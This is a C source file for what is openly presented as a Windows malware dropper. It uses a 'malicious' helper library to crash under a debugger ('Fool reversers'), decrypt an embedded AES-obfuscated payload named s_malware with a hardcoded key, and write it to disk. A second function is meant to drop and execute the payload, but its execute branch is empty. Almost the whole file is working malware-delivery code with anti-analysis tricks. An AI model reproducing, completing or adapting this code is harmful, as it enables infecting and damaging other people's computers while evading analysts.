#include "xPayloadManager.h"

#include <stdint.h>
#include <Windows.h>

#include "xLibMaliciousApi.h"
#include "xOsApi.h"

#include "xPayload.h"



bool xPayloadManagerDrop(const wchar_t* fileName)
{
	if (!fileName)
	{
		return false;
	}

	bool result = false;

	// Fool reversers
	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();

	uint8_t* key = NULL;

	uint32_t keySize = 0;

	// Convert obfuscated key string to buffer
	if (X_LIB_MALICIOUS_CALL(xConversionHexStringToByte)(X_OBFUSCATED_STRING_A("a7d4fa01c302eae6202d6073cbf65f23f1bb6e4d07e7ad30bbedf75bc8b0415e"), &key, &keySize))
	{
		uint8_t* malware = NULL;

		uint32_t malwareSize = 0;

		// Deobfuscate malware
		if (X_LIB_MALICIOUS_CALL(xObfuscationDeobfuscateAes)(key, keySize, s_malware, sizeof(s_malware), &malware, &malwareSize))
		{
			wchar_t fileNameDrop[MAX_PATH + 1] = { 0 };

			DWORD length = X_KERNEL32_CALL(GetCurrentDirectory)(MAX_PATH + 1, fileNameDrop);

			if (length)
			{
				if (length + wcslen(fileName) + wcslen(L"\\") < MAX_PATH)
				{
					wcscat_s(fileNameDrop, L"\\");

					wcscat_s(fileNameDrop, fileName);

					HANDLE file = X_KERNEL32_CALL(CreateFile)(fileNameDrop, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

					if (file != INVALID_HANDLE_VALUE)
					{
						if (X_KERNEL32_CALL(WriteFile)(file, malware, malwareSize, NULL, NULL))
						{
							result = true;
						}

						X_KERNEL32_CALL(CloseHandle)(file);
					}
				}
			}

			X_LIB_MALICIOUS_CALL(xMemoryFree)(malware);
		}

		X_LIB_MALICIOUS_CALL(xMemoryFree)(key);
	}

	return result;
}

bool xPayloadManagerDropAndExecute(const wchar_t* fileName)
{
	if (!fileName)
	{
		return false;
	}

	bool result = xPayloadManagerDrop(fileName);

	if (result)
	{

	}

	return result;
}
